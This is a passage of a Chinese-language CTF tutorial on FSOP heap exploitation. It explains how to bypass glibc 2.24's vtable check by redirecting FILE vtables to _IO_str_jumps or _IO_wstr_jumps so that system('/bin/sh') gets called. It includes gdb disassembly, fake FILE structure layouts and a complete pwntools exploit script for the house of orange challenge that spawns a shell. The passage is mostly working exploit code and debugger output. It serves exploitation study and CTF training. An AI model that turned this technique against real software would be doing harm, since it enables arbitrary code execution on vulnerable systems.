&amp;gt;= section_length)) /* The vtable pointer is not in the expected section. Use the slow path, which will terminate the process if necessary. */ _IO_vtable_check (); return vtable;}/* Perform vtable pointer validation. If validation fails, terminate the process. */static inline const struct _IO_jump_t *IO_validate_vtable (const struct _IO_jump_t *vtable){ /* Fast path: The vtable pointer is within the __libc_IO_vtables section. */ uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables; const char *ptr = (const char *) vtable; uintptr_t offset = ptr - __start___libc_IO_vtables; if (__glibc_unlikely (offset &amp;gt;= section_length)) /* The vtable pointer is not in the expected section. Use the slow path, which will terminate the process if necessary. */ _IO_vtable_check (); return vtable;}新增了这个check之后，我们就不能把vtable写在heap段了。于是为了让FSOP还能继续玩，就可以有两种方法： 第一种方法：不和vtable玩了，通过将stdin/stdout这些标准IO的file structure纂改成fread/fwrite，从而实现任意地址读写。 构造方法见3.4小节 本章节不重点将这个的构造方法了 第二种方法：当然是想办法bypass掉vtable的check思路不能写在heap段，bypass的方法也很简单，就复用glibc里的vtable。bypass的核心思想在第三节已经写过了： 同时，很重要的一点是 vtable是没有做对齐检查的，这是什么意思呢？ FILE-&amp;gt;vtable指向的应该是一个_IO_jump_t结构体类型的_IO_file_jumps变量，在取fp-&amp;gt;vtable值的时候不会去检查是不是指向了结构体的开头，而是直接拿到vtable地址，然后在该地址上直接加上0x18，就得到目标函数的地址了。 认清楚这一点对于bypass glibc2.24中新增的vtable check至关重要。所以vtable check只检查了我们不能把vtable指向一些乱七八糟的地方，那么把它指向合法vtable的前后是没问题的，然后使得_IO_flush_all_lockp函数中_IO_OVERFLOW (fp, EOF) == EOF这行代码可以call到我们指定的函数例如这篇文档提出的通过_IO_str_overflow函数来bypass，这个函数其实就在_IO_file_overflow的后面：pwndbg&amp;gt; p &amp;amp;_IO_file_jumps$3 = (const struct _IO_jump_t *) 0x7ffff7dd06e0 &amp;lt;_IO_file_jumps&amp;gt;pwndbg&amp;gt; tele 0x7ffff7dd06e000:0000│ 0x7ffff7dd06e0 (_IO_file_jumps) ◂— 0x001:0008│ 0x7ffff7dd06e8 (_IO_file_jumps+8) ◂— 0x002:0010│ 0x7ffff7dd06f0 (_IO_file_jumps+16) —▸ 0x7ffff7a869d0 (_IO_file_finish) ◂— push rbx &amp;lt;==== 正常流程下_IO_flush_all_lockp中会调用这个函数03:0018│ 0x7ffff7dd06f8 (_IO_file_jumps+24) —▸ 0x7ffff7a87740 (_IO_file_overflow) ◂— mov ecx, dword ptr [rdi]04:0020│ 0x7ffff7dd0700 (_IO_file_jumps+32) —▸ 0x7ffff7a874b0 (_IO_file_underflow) ◂— mov eax, dword ptr [rdi].........pwndbg&amp;gt;18:00c0│ 0x7ffff7dd07a0 (_IO_str_jumps) ◂— 0x0 &amp;lt;=== 把vtable指到这里来19:00c8│ 0x7ffff7dd07a8 (_IO_str_jumps+8) ◂— 0x01a:00d0│ 0x7ffff7dd07b0 (_IO_str_jumps+16) —▸ 0x7ffff7a89fb0 (_IO_str_finish) ◂— push rbx1b:00d8│ 0x7ffff7dd07b8 (_IO_str_jumps+24) —▸ 0x7ffff7a89c90 (_IO_str_overflow) ◂— mov ecx, dword ptr [rdi] &amp;lt;=== 可以call这个函数了，0x18的偏移在这里1c:00e0│ 0x7ffff7dd07c0 (_IO_str_jumps+32) —▸ 0x7ffff7a89c30 (_IO_str_underflow) ◂— mov rax, qword ptr [rdi + 0x28]那么为什么_IO_file_overflow函数不能用于控制程序流，而_IO_str_overflow就可以呢，其实本质是看函数内是否有相对地址调用，也就是看汇编代码的call指令pwndbg&amp;gt; disassemble _IO_file_overflowDump of assembler code for function _IO_new_file_overflow: 0x00007ffff7a87740 &amp;lt;+0&amp;gt;: mov ecx,DWORD PTR [rdi] 0x00007ffff7a87742 &amp;lt;+2&amp;gt;: test cl,0x8 0x00007ffff7a87745 &amp;lt;+5&amp;gt;: jne 0x7ffff7a878e0 &amp;lt;_IO_new_file_overflow+416&amp;gt; ... 0x00007ffff7a87826 &amp;lt;+230&amp;gt;: call 0x7ffff7a873a0 &amp;lt;_IO_new_do_write&amp;gt; ... 0x00007ffff7a8784a &amp;lt;+266&amp;gt;: call 0x7ffff7a881f0 &amp;lt;__GI__IO_free_backup_area&amp;gt; ... 0x00007ffff7a8789f &amp;lt;+351&amp;gt;: call 0x7ffff7a816d0 &amp;lt;__GI__IO_wdo_write&amp;gt; ... 0x00007ffff7a87903 &amp;lt;+451&amp;gt;: call 0x7ffff7a88570 &amp;lt;__GI__IO_doallocbuf&amp;gt; ... 0x00007ffff7a87926 &amp;lt;+486&amp;gt;: call 0x7ffff7a873a0 &amp;lt;_IO_new_do_write&amp;gt;可以看到_IO_file_overflow函数内都是绝对地址调用，不管怎么控制程序流，都是固定call这些函数。而_IO_str_finish函数就不一样了pwndbg&amp;gt; disassemble _IO_str_overflowDump of assembler code for function __GI__IO_str_overflow: 0x00007ffff7a89c90 &amp;lt;+0&amp;gt;: mov ecx,DWORD PTR [rdi] 0x00007ffff7a89c92 &amp;lt;+2&amp;gt;: test cl,0x8 0x00007ffff7a89c95 &amp;lt;+5&amp;gt;: je 0x7ffff7a89ca8 &amp;lt;__GI__IO_str_overflow+24&amp;gt; ... 0x00007ffff7a89cdf &amp;lt;+79&amp;gt;: mov rbx,rdi ... 0x00007ffff7a89d0e &amp;lt;+126&amp;gt;: mov rdi,r14 &amp;lt;=== rdi可控 0x00007ffff7a89d11 &amp;lt;+129&amp;gt;: call QWORD PTR [rbx+0xe0] &amp;lt;=== 相对地址调用 ... 0x00007ffff7a89d31 &amp;lt;+161&amp;gt;: call 0x7ffff7aa14f0 &amp;lt;__memcpy_sse2&amp;gt; ... 0x00007ffff7a89d39 &amp;lt;+169&amp;gt;: call QWORD PTR [rbx+0xe8]可以看到是存在相对地址调用的：call QWORD PTR [rbx+0xe0]，rbx来源：mov rbx,rdi , 而rdi = fp，所以要call的函数就在我们伪造的file structure的偏移0xe0处。在0xe0处填上system，就能call到system了.我们知道vtable的偏移是0xd8=0xe0-0x8，所以就是在vtable下填上system即可。同时system的参数也就是rdi是可以在函数内部控制的，mov rdi,r14 &amp;lt;=== rdi可控具体见_IO_str_overflow源码，或者原作者解析。我就不展开讲了结论就是：_flags = 0_IO_write_base = 0_IO_write_ptr = 0x7fffffffffffffff_IO_buf_base = 0_IO_buf_end = (bin_sh_addr - 100)/2 哦对了，需要提一醒的是_IO_write_ptr这个值还是设置大一点好 原作者提到“flush_only is 0, so we want pos &amp;gt;= _IO_blen(fp). This can be achieved by setting _IO_write_ptr = (x - 100)/2 and _IO_write_base = 0.” 对应代码就是： int flush_only = c == EOF;pos = fp-&amp;gt;_IO_write_ptr - fp-&amp;gt;_IO_write_base;if (pos &amp;gt;= (_IO_size_t) (_IO_blen (fp) + flush_only) 但是实际上flush_only 这值啊，不一定是0，我试了下有可能是-1 虽说这里运算是(_IO_size_t) (_IO_blen (fp) + flush_only)) 加上一个-1，想当然这值相比于flush_only是0时会变小，但是按照补码0xffffffff去计算，然后再符号转换一下，还真不一定，我就踩过坑还是_IO_write_ptr设置的大一点 比较保险 设置成0x7fffffffffffffff稳稳当当一图胜千言，和原先相比只有vtable指向变了，以及file structure内除了构造FSOP的利用条件外，还需要构造控制_IO_str_overflow执行流的条件举一反三按照这个思路，网上很多人提出的bypass技巧都迎刃而解了，甚至可以想到更多的function，只需要寻找满足以下两点： function内存在相对地址调用 rdi可控就可以控制程序执行流，从而执行system(&quot;/bin/sh&quot;)了我们找libio_vtable内的struct一搜一堆。 _IO_str_finish就在_IO_str_overflow上面pwndbg&amp;gt; disassemble _IO_str_finishDump of assembler code for function _IO_str_finish: 0x00007ffff7a89fb0 &amp;lt;+0&amp;gt;: push rbx 0x00007ffff7a89fb1 &amp;lt;+1&amp;gt;: mov rbx,rdi 0x00007ffff7a89fb4 &amp;lt;+4&amp;gt;: mov rdi,QWORD PTR [rdi+0x38] &amp;lt;=== rdi可控 0x00007ffff7a89fb8 &amp;lt;+8&amp;gt;: test rdi,rdi 0x00007ffff7a89fbb &amp;lt;+11&amp;gt;: je 0x7ffff7a89fc8 &amp;lt;_IO_str_finish+24&amp;gt; 0x00007ffff7a89fbd &amp;lt;+13&amp;gt;: test BYTE PTR [rbx],0x1 0x00007ffff7a89fc0 &amp;lt;+16&amp;gt;: jne 0x7ffff7a89fc8 &amp;lt;_IO_str_finish+24&amp;gt; 0x00007ffff7a89fc2 &amp;lt;+18&amp;gt;: call QWORD PTR [rbx+0xe8] &amp;lt;=== 相对地址调用 0x00007ffff7a89fc8 &amp;lt;+24&amp;gt;: mov QWORD PTR [rbx+0x38],0x0 0x00007ffff7a89fd0 &amp;lt;+32&amp;gt;: mov rdi,rbx 0x00007ffff7a89fd3 &amp;lt;+35&amp;gt;: xor esi,esi 0x00007ffff7a89fd5 &amp;lt;+37&amp;gt;: pop rbx 0x00007ffff7a89fd6 &amp;lt;+38&amp;gt;: jmp 0x7ffff7a88c20 &amp;lt;__GI__IO_default_finish&amp;gt;源码：void_IO_str_finish (_IO_FILE *fp, int dummy){ if (fp-&amp;gt;_IO_buf_base &amp;amp;&amp;amp; !(fp-&amp;gt;_flags &amp;amp; _IO_USER_BUF)) (((_IO_strfile *) fp)-&amp;gt;_s._free_buffer) (fp-&amp;gt;_IO_buf_base); &amp;lt;=== 就这行 fp-&amp;gt;_IO_buf_base = NULL; _IO_default_finish (fp, 0);} _IO_wstr_finishpwndbg&amp;gt; tele 0x7ffff7dcbc6000:0000│ 0x7ffff7dcbc60 (_IO_wstr_jumps) ◂— 0x001:0008│ 0x7ffff7dcbc68 (_IO_wstr_jumps+8) ◂— 0x002:0010│ 0x7ffff7dcbc70 (_IO_wstr_jumps+16) —▸ 0x7ffff7a71800 (_IO_wstr_finish) ◂— push rbx03:0018│ 0x7ffff7dcbc78 (_IO_wstr_jumps+24) —▸ 0x7ffff7a713e0 (_IO_wstr_overflow) ◂— mov edx, dword ptr [rdi]pwndbg&amp;gt; disassemble _IO_wstr_finishDump of assembler code for function _IO_wstr_finish: 0x00007ffff7a80260 &amp;lt;+0&amp;gt;: push rbx 0x00007ffff7a80261 &amp;lt;+1&amp;gt;: mov rax,QWORD PTR [rdi+0xa0] 0x00007ffff7a80268 &amp;lt;+8&amp;gt;: mov rbx,rdi 0x00007ffff7a8026b &amp;lt;+11&amp;gt;: mov rdi,QWORD PTR [rax+0x30] &amp;lt;=== rdi可控 0x00007ffff7a8026f &amp;lt;+15&amp;gt;: test rdi,rdi 0x00007ffff7a80272 &amp;lt;+18&amp;gt;: je 0x7ffff7a80287 &amp;lt;_IO_wstr_finish+39&amp;gt; 0x00007ffff7a80274 &amp;lt;+20&amp;gt;: test BYTE PTR [rbx+0x74],0x8 0x00007ffff7a80278 &amp;lt;+24&amp;gt;: jne 0x7ffff7a80287 &amp;lt;_IO_wstr_finish+39&amp;gt; 0x00007ffff7a8027a &amp;lt;+26&amp;gt;: call QWORD PTR [rbx+0xe8] &amp;lt;=== 相对地址调用 0x00007ffff7a80280 &amp;lt;+32&amp;gt;: mov rax,QWORD PTR [rbx+0xa0] 0x00007ffff7a80287 &amp;lt;+39&amp;gt;: mov QWORD PTR [rax+0x30],0x0 0x00007ffff7a8028f &amp;lt;+47&amp;gt;: mov rdi,rbx 0x00007ffff7a80292 &amp;lt;+50&amp;gt;: xor esi,esi 0x00007ffff7a80294 &amp;lt;+52&amp;gt;: pop rbx 0x00007ffff7a80295 &amp;lt;+53&amp;gt;: jmp 0x7ffff7a7eef0 &amp;lt;__GI__IO_wdefault_finish&amp;gt;void_IO_wstr_finish (_IO_FILE *fp, int dummy){ if (fp-&amp;gt;_wide_data-&amp;gt;_IO_buf_base &amp;amp;&amp;amp; !(fp-&amp;gt;_flags2 &amp;amp; _IO_FLAGS2_USER_WBUF)) (((_IO_strfile *) fp)-&amp;gt;_s._free_buffer) (fp-&amp;gt;_wide_data-&amp;gt;_IO_buf_base); &amp;lt;=== 就这行 fp-&amp;gt;_wide_data-&amp;gt;_IO_buf_base = NULL; _IO_wdefault_finish (fp, 0);} _IO_wstr_overflow_IO_wint_t_IO_wstr_overflow (_IO_FILE *fp, _IO_wint_t c){ wchar_t *old_buf = fp-&amp;gt;_wide_data-&amp;gt;_IO_buf_base; if (old_buf) { __wmemcpy (new_buf, old_buf, old_wblen); (*((_IO_strfile *) fp)-&amp;gt;_s._free_buffer) (old_buf); &amp;lt;=== 就这行 /* Make sure _IO_setb won&#39;t try to delete _IO_buf_base. */ fp-&amp;gt;_wide_data-&amp;gt;_IO_buf_base = NULL; } _IO_wfile_syncwint_t_IO_wfile_sync (_IO_FILE *fp){ _IO_ssize_t delta; wint_t retval = 0; /* char* ptr = cur_ptr(); */ if (fp-&amp;gt;_wide_data-&amp;gt;_IO_write_ptr &amp;gt; fp-&amp;gt;_wide_data-&amp;gt;_IO_write_base) if (_IO_do_flush (fp)) return WEOF; delta = fp-&amp;gt;_wide_data-&amp;gt;_IO_read_ptr - fp-&amp;gt;_wide_data-&amp;gt;_IO_read_end; if (delta != 0) { /* We have to find out how many bytes we have to go back in the external buffer. */ struct _IO_codecvt *cv = fp-&amp;gt;_codecvt; &amp;lt;==== 这里 _IO_off64_t new_pos;等等等等，反正能用的肯定很多。总结OK，现在知道了如何bypass vtable check，再稍微总结下对应各个function，file sturcture需要满足什么条件 _IO_str_overflow_flags = 0_IO_write_base = 0_IO_write_ptr = 0x7fffffffffffffff_IO_buf_base = 0_IO_buf_end = (bin_sh_addr - 100)/2 &amp;amp;fp + 0xe0 = system _IO_str_finish_flags = 0_IO_buf_base = bin_sh_addr &amp;amp;fp + 0xe8 = system _IO_wstr_finish_wide_data-&amp;gt;_IO_buf_base = bin_sh_addr # 需要leak heap，稍微麻烦点_flags2 = 0&amp;amp;fp + 0xe8 = system当然，达成FSOP的条件不能忘记 fp-&amp;gt;_mode &amp;lt;= 0 &amp;amp;&amp;amp; fp-&amp;gt;_IO_write_ptr &amp;gt; fp-&amp;gt;_IO_write_base _IO_vtable_offset (fp) == 0 &amp;amp;&amp;amp; fp-&amp;gt;_mode &amp;gt; 0 &amp;amp;&amp;amp; (fp-&amp;gt;_wide_data-&amp;gt;_IO_write_ptr &amp;gt; fp-&amp;gt;_wide_data-&amp;gt;_IO_write_base) 总结：不同方法，都是殊途同归，最终都是通过相对地址调用来call system(“/bin/sh”)0x06 house of orange (glibc 2.24)认真看完第五节的内容，了解如何bypass vtable check后，稍微改一下exp就可以完成glibc 2.24下house of orange的利用了嗯，一定是这样的，没错。 NO！！还是遇到了一个大坑！修改后的exp：fake_vtable = io_str_overflow_addr - 0x18p = &#39;c&#39;*0x420 # padding to unsorted bin chunkp += &#39;/bin/sh\\x00&#39; + p64(0x61) # fake file structure, to smallbin[4], _chainp += p64(0) # fdp += p64(io_list_all_addr - 0x10) # bk, unsorted bin attackp += p64(0) # _IO_write_basep += p64((bin_sh_addr - 100) / 2) # _IO_write_ptrp += p64(0) # _IO_write_endp += p64(0) # _IO_buf_basep += p64((bin_sh_addr - 100) / 2) # _IO_buf_endp += &#39;\\x00&#39;*0x90 # padding to vtablep += p64(fake_vtable)p += p64(system)实际运行结果：Program received signal SIGSEGV, Segmentation fault._dl_debug_initialize (ldbase=ldbase@entry=0, ns=-2) at dl-debug.c:5858 dl-debug.c: No such file or directory.LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA─────────────────────────────────────[ REGISTERS ]──────────────────────────────────────*RAX 0x7ffff7ffcf88 (_DYNAMIC+280) ◂— 0xa /* &#39;\\n&#39; */ RBX 0x0*RCX 0x7fffffffd510 —▸ 0x7fffffffd620 ◂— 0x0*RDX 0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe168 —▸ 0x555555554000 ◂— jg 0x555555554047 RDI 0x0*RSI 0xfffffffffffffffe...*RSP 0x7fffffffd3d8 —▸ 0x7ffff7dec26b (_dl_open+731) ◂— mov edx, dword ptr [rax + 0x18]*RIP 0x7ffff7de8419 (_dl_debug_initialize+105) ◂— mov dword ptr [rax], 1───────────────────────────────────────[ DISASM ]─────────────────────────────────────── ► 0x7ffff7de8419 &amp;lt;_dl_debug_initialize+105&amp;gt; mov dword ptr [rax], 1 &amp;lt;_DYNAMIC+280&amp;gt; 0x7ffff7de841f &amp;lt;_dl_debug_initialize+111&amp;gt; jne _dl_debug_initialize+43 &amp;lt;_dl_debug_initialize+43&amp;gt; 0x7ffff7de8421 &amp;lt;_dl_debug_initialize+113&amp;gt; mov rdx, qword ptr [rip + 0x214bb8] 0x7ffff7de8428 &amp;lt;_dl_debug_initialize+120&amp;gt; mov rdi, qword ptr [rdx + 0x20]pwndbg&amp;gt; bt#0 _dl_debug_initialize (ldbase=ldbase@entry=0, ns=-2) at dl-debug.c:58#1 0x00007ffff7dec26b in _dl_open (file=0x7ffff7b9a586 &quot;libgcc_s.so.1&quot;, mode=&amp;lt;optimized out&amp;gt;, caller_dlopen=0x7ffff7b27851 &amp;lt;__GI___backtrace+193&amp;gt;, nsid=&amp;lt;optimized out&amp;gt;, argc=&amp;lt;optimized out&amp;gt;, argv=&amp;lt;optimized out&amp;gt;, env=0x7fffffffe168) at dl-open.c:688#2 0x00007ffff7b561fd in do_dlopen (ptr=ptr@entry=0x7fffffffd630) at dl-libc.c:87#3 0x00007ffff7de7874 in _dl_catch_error (objname=0x7fffffffd620, errstring=0x7fffffffd628, mallocedp=0x7fffffffd61f, operate=0x7ffff7b561c0 &amp;lt;do_dlopen&amp;gt;, args=0x7fffffffd630) at dl-error.c:187#4 0x00007ffff7b562b4 in dlerror_run (args=0x7fffffffd630, operate=0x7ffff7b561c0 &amp;lt;do_dlopen&amp;gt;) at dl-libc.c:46#5 __GI___libc_dlopen_mode (name=name@entry=0x7ffff7b9a586 &quot;libgcc_s.so.1&quot;, mode=mode@entry=-2147483647) at dl-libc.c:163#6 0x00007ffff7b27851 in init () at ../sysdeps/x86_64/backtrace.c:52#7 __GI___backtrace (array=array@entry=0x7fffffffd690, size=size@entry=64) at ../sysdeps/x86_64/backtrace.c:105#8 0x00007ffff7a2fa76 in backtrace_and_maps (do_abort=&amp;lt;optimized out&amp;gt;, do_abort@entry=2, written=&amp;lt;optimized out&amp;gt;, fd=fd@entry=3) at ../sysdeps/unix/sysv/linux/libc_fatal.c:47#9 0x00007ffff7a8908b in __libc_message (do_abort=2, fmt=fmt@entry=0x7ffff7b9f000 &quot;*** Error in `%s&#39;: %s: 0x%s ***\\n&quot;) at ../sysdeps/posix/libc_fatal.c:172#10 0x00007ffff7a94ace in malloc_printerr (ar_ptr=0x7ffff7dd1b00 &amp;lt;main_arena&amp;gt;, ptr=0x7ffff7dd2500 &amp;lt;_IO_list_all&amp;gt;, str=0x7ffff7b9bc28 &quot;malloc(): memory corruption&quot;, action=&amp;lt;optimized out&amp;gt;) at malloc.c:5048#11 _int_malloc (av=av@entry=0x7ffff7dd1b00 &amp;lt;main_arena&amp;gt;, bytes=bytes@entry=16) at malloc.c:3511诶，我人晕了，__libc_message后咋就进了 backtrace_and_maps然后一去不复返了，我的_IO_flush_all_lockp呢？libc_fatal.c:172if (do_abort) { BEFORE_ABORT (do_abort, written, fd); &amp;lt;==== 这里有问题 /* Kill the application. */ abort (); }没能走到abort()里 会进入到这里dl-debug.c:58/* Initialize _r_debug if it has not already been done. The argument is the run-time load address of the dynamic linker, to be put in _r_debug.r_ldbase. Returns the address of _r_debug. */struct r_debug *internal_function_dl_debug_initialize (ElfW(Addr) ldbase, Lmid_t ns){ struct r_debug *r; if (ns == LM_ID_BASE) r = &amp;amp;_r_debug; else r = &amp;amp;GL(dl_ns)[ns]._ns_debug; if (r-&amp;gt;r_map == NULL || ldbase != 0) { /* Tell the debugger where to find the map of loaded objects. */ r-&amp;gt;r_version = 1 /* R_DEBUG_VERSION XXX */; r-&amp;gt;r_ldbase = ldbase ?: _r_debug.r_ldbase; r-&amp;gt;r_map = (void *) GL(dl_ns)[ns]._ns_loaded; r-&amp;gt;r_brk = (ElfW(Addr)) &amp;amp;_dl_debug_state; } return r;}看了下ldbase是0啥的，可能是LD的问题于是试了下glibc all in one里所有的2.24版本，都不行： 2.24-3ubuntu1_amd64 2.24-3ubuntu2.2_amd64 2.24-9ubuntu2.2_amd64 2.24-9ubuntu2_amd64emmm，换到2.26就可以了❯ ldd houseoforange2.24 linux-vdso.so.1 (0x00007ffff7ffb000) /home/sirius/glibc-all-in-one/libs/2.26-0ubuntu2.1_amd64/libc-2.26.so (0x00007ffff77e1000) /home/sirius/glibc-all-in-one/libs/2.26-0ubuntu2.1_amd64/ld-2.26.so =&amp;gt; /lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd3000)poc:p = &#39;c&#39;*0x420 # padding to unsorted bin chunkp += p64(0) + p64(0x61) # fake file structure, to smallbin[4], _chainp += p64(0) # fdp += p64(io_list_all_addr - 0x10) # bk, unsorted bin attackp += p64(0) # _IO_write_basep += p64(0x7fffffffffffffff) # _IO_write_ptrp += p64(0) # _IO_write_endp += p64(0) # _IO_buf_basep += p64((bin_sh_addr - 100) / 2) # _IO_buf_endp += &#39;\\x00&#39;*0x90 # padding to vtablep += p64(fake_vtable)p += &#39;a&#39;*0x20# p += p64(system_addr)运行结果，成功控制RIPProgram received signal SIGSEGV, Segmentation fault.0x00007ffff7a7c7c1 in __GI__IO_str_overflow (fp=0x555555766750, c=-1) at strops.c:107107 strops.c: No such file or directory.LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA─────────────────────────────────────[ REGISTERS ]──────────────────────────────────────*RAX 0x3ffffbdcc75f*RBX 0x555555766750 ◂— 0x0*RCX 0x0*RDX 0x7fffffffffffffff*RDI 0x7ffff7b98f20 ◂— 0x68732f6e69622f /* &#39;/bin/sh&#39; */*RSI 0x7fffffffffffffff...*RBP 0xffffffff*RSP 0x7fffffffda70 —▸ 0x7ffff7ffe6f0 —▸ 0x7ffff7ffb000 ◂— jg 0x7ffff7ffb047*RIP 0x7ffff7a7c7c1 (_IO_str_overflow+129) ◂— call qword ptr [rbx + 0xe0]───────────────────────────────────────[ DISASM ]─────────────────────────────────────── ► 0x7ffff7a7c7c1 &amp;lt;_IO_str_overflow+129&amp;gt; call qword ptr [rbx + 0xe0] &amp;lt;0x6161616161616161&amp;gt; 0x7ffff7a7c7c7 &amp;lt;_IO_str_overflow+135&amp;gt; test rax, rax 0x7ffff7a7c7ca &amp;lt;_IO_str_overflow+138&amp;gt; mov r13, rax 0x7ffff7a7c7cd &amp;lt;_IO_str_overflow+141&amp;gt; je _IO_str_overflow+400 &amp;lt;_IO_str_overflow+400&amp;gt;程序：house of orange 2.26, libc, ld写了好几个利用方法，完整的EXP：#!/usr/bin/env python2# -*- coding: utf-8 -*-# house of orange, exp for glibc 2.24from platform import systemfrom pwn import *context.log_level = &#39;debug&#39;context.terminal = [&#39;tmux&#39;, &#39;split&#39;, &#39;-h&#39;]def debug(cmd=&#39;&#39;): gdb.attach(r, cmd) pause()r = process(&quot;./houseoforange2.24&quot;)libc = ELF(&#39;/home/sirius/glibc-all-in-one/libs/2.26-0ubuntu2.1_amd64/libc-2.26.so&#39;)def build(name_length, name, price=12, color=1): r.recvuntil(&quot;Your choice :&quot;) r.sendline(&#39;1&#39;) r.recvuntil(&quot;Length of name :&quot;) r.sendline(str(name_length)) r.recvuntil(&quot;Name :&quot;) r.send(name) r.recvuntil(&quot;Price of Orange:&quot;) r.sendline(str(price)) r.recvuntil(&quot;Color of Orange:&quot;) r.sendline(str(color))def show(): r.recvuntil(&quot;Your choice :&quot;) r.sendline(&#39;2&#39;)def edit(name_length, name, price=12, color=1): r.recvuntil(&quot;Your choice :&quot;) r.sendline(&#39;3&#39;) r.recvuntil(&quot;Length of name :&quot;) r.sendline(str(name_length)) r.recvuntil(&quot;Name:&quot;) r.send(name) r.recvuntil(&quot;Price of Orange:&quot;) r.sendline(str(price)) r.recvuntil(&quot;Color of Orange:&quot;) r.sendline(str(color))build(0x20, &#39;a&#39;)p = &#39;a&#39;*0x40 + p64(0) + p64(0xd41)edit(len(p), p)build(0x1000, &#39;b&#39;) # 最大就0x1000build(0x400, &#39;c&#39;*8)show()r.recvuntil(&quot;c&quot;*8)libc_addr = u64(r.recvuntil(&quot;\\n&quot;)[:-1].ljust(8, &#39;\\x00&#39;)) - 0x3db278# 0x3c2168log.success(&#39;libc addr ===&amp;gt; 0x{:x}&#39;.format(libc_addr))# 由于vtable的check，无法将vtable写到heap段，所以不需要leak heap了# 改动：但是有些函数的bypass需要改fp-&amp;gt;_wide_data，所以还是leak一下edit(0x10, &#39;c&#39;*0x10)show()r.recvuntil(&quot;c&quot;*0x10)heap_addr = u64(r.recvuntil(&quot;\\n&quot;)[:-1].ljust(8, &#39;\\x00&#39;))log.success(&#39;heap addr ===&amp;gt; 0x{:x}&#39;.format(heap_addr))io_list_all_off = libc.symbols[&#39;_IO_list_all&#39;]io_list_all_addr = libc_addr + io_list_all_offsystem_off = libc.symbols[&#39;system&#39;]system_addr = libc_addr + system_offio_file_jumps_off = libc.symbols[&#39;_IO_file_jumps&#39;]io_file_jumps_addr = libc_addr + io_file_jumps_offio_str_overflow_addr = io_file_jumps_addr + 0xd8io_str_finish_addr = io_file_jumps_addr + 0xd0io_wstr_finish_addr = libc_addr + 0x3d6c70bin_sh_addr = libc_addr + next(libc.search(&#39;/bin/sh&#39;))poc_list = [&#39;_IO_str_overflow&#39;, &#39;_IO_str_finish&#39;, &#39;_IO_wstr_finish&#39;]poc = poc_list[2]if poc == &#39;_IO_str_overflow&#39;: fake_vtable = io_str_overflow_addr - 0x18 p = &#39;c&#39;*0x420 # padding to unsorted bin chunk fake_file = p64(0) + p64(0x61) # fake file structure, to smallbin[4], _chain fake_file += p64(0) # fd fake_file += p64(io_list_all_addr - 0x10) # bk, unsorted bin attack fake_file += p64(0) # _IO_write_base fake_file += p64(0x7fffffffffffffff) # _IO_write_ptr fake_file += p64(0) # _IO_write_end fake_file += p64(0) # _IO_buf_base fake_file += p64((bin_sh_addr - 100) / 2) # _IO_buf_end fake_file = fake_file.ljust(0xd8, &#39;\\x00&#39;) # padding to vtable fake_file += p64(fake_vtable) fake_file = fake_file.ljust(0xe0, &#39;\\x00&#39;) # padding to 0xe0 fake_file += p64(system_addr) p += fake_fileelif poc == &#39;_IO_str_finish&#39;: fake_vtable = io_str_finish_addr - 0x18 p = &#39;c&#39;*0x420 # padding to unsorted bin chunk fake_file = p64(0) + p64(0x61) # fake file structure, to smallbin[4], _chain fake_file += p64(0) # fd fake_file += p64(io_list_all_addr - 0x10) # bk, unsorted bin attack fake_file += p64(0) # _IO_write_base fake_file += p64(1) # _IO_write_ptr fake_file += p64(0) # _IO_write_end fake_file += p64(bin_sh_addr) # _IO_buf_base, rdi fake_file = fake_file.ljust(0xd8, &#39;\\x00&#39;) # padding to vtable fake_file += p64(fake_vtable) fake_file = fake_file.ljust(0xe8, &#39;\\x00&#39;) # padding to 0xe8 fake_file += p64(system_addr) #rip p += fake_fileelif poc == &#39;_IO_wstr_finish&#39;: fake_vtable = io_wstr_finish_addr - 0x18 fake_wide_data = heap_addr + 0x430 + 0x68 # _wide_data指到FILE-&amp;gt;_chain, _wide_data-&amp;gt;_IO_buf_base刚好指到了FILE-&amp;gt;_codecvt p = &#39;c&#39;*0x420 # padding to unsorted bin chunk fake_file = p64(0) + p64(0x61) # fake file structure, to smallbin[4], _chain fake_file += p64(0) # fd fake_file += p64(io_list_all_addr - 0x10) # bk, unsorted bin attack fake_file += p64(0) # _IO_write_base fake_file += p64(1) # _IO_write_ptr fake_file = fake_file.ljust(0x98, &#39;\\x00&#39;) # padding to _codecvt fake_file += p64(bin_sh_addr) # _codecvt, _wide_data-&amp;gt;_IO_buf_base fake_file += p64(fake_wide_data) # _wide_data fake_file = fake_file.ljust(0xd8, &#39;\\x00&#39;) # padding to vtable fake_file += p64(fake_vtable) fake_file = fake_file.ljust(0xe8, &#39;\\x00&#39;) # padding to 0xe8 fake_file += p64(system_addr) p += fake_fileedit(len(p), p)# debug(&quot;b *_IO_flush_all_lockp\\n&quot;)r.sendline(&#39;1&#39;)r.interactive()测试FSOP条件是否达成，以及看看call的是什么函数，使用pwngdb的fsop命令很方便：pwndbg&amp;gt; fsop---------- fp : 0x7ffff7dcfc78 ----------_IO_write_ptr(0x7ffff7dcfc88) &amp;lt; _IO_write_base(0x7ffff7dcfc88)Result : False---------- fp : 0x555555766750 ----------Result : TrueFunc : 0x7ffff7a7cae0pwndbg&amp;gt; x/gx 0x7ffff7a7cae00x7ffff7a7cae0 &amp;lt;_IO_str_finish&amp;gt;: 0x387f8b48fb894853pwndbg&amp;gt; fpchainfpchain: 0x7ffff7dcfc78 --&amp;gt; 0x555555766750 --&amp;gt; 0x0pwndbg&amp;gt; fp 0x555555766750$1 = { file = { _flags = 0, _IO_read_ptr = 0x61 &amp;lt;error: Cannot access memory at address 0x61&amp;gt;, _IO_read_end = 0x7ffff7dcfcc8 &amp;lt;main_arena+168&amp;gt; &quot;\\270\\374\\334\\367\\377\\177&quot;, _IO_read_base = 0x7ffff7dcfcc8 &amp;lt;main_arena+168&amp;gt; &quot;\\270\\374\\334\\367\\377\\177&quot;, _IO_write_base = 0x0, _IO_write_ptr = 0x1 &amp;lt;error: Cannot access memory at address 0x1&amp;gt;, _IO_write_end = 0x0, _IO_buf_base = 0x7ffff7b98f20 &quot;/bin/sh&quot;, _IO_buf_end = 0x0, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x0, _fileno = 0, _flags2 = 0, _old_offset = 0, _cur_column = 0, _vtable_offset = 0 &#39;\\000&#39;, _shortbuf = &quot;&quot;, _lock = 0x0, _offset = 0, _codecvt = 0x0, 